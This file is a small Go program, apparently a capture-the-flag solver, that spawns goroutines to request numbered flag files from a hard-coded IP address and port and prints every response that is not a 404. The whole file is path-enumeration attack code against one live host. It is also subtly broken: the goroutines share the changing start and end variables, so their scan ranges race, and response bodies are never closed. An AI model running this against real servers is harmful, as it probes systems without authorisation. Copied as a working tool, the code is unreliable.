package main

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/signal"
	"strings"
)

func main() {
	start, end := 1, 1000
	go func() {
		traversal(start, end)
	}()
	for i := 0; i < 10; i++ {
		start += 1000
		end += 1000
		go func() {
			traversal(start, end)
		}()
	}
	fmt.Println("start", start, "end", end)

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt)
	select {
	case <-sig:
		log.Println("bye bye")
	}
}

func traversal(from, to int) {
	for i := from; i <= to; i++ {
		resp, err := http.Get(fmt.Sprintf("http://18.141.143.171:30720/flag%d.txt", i))
		if err != nil {
			log.Println(err)
			return
		}

		data, _ := io.ReadAll(resp.Body)
		if !strings.Contains(string(data), "404") {
			fmt.Println(string(data))
		}
		if i%100 == 0 {
			log.Println("solve", i)
		}
	}
}
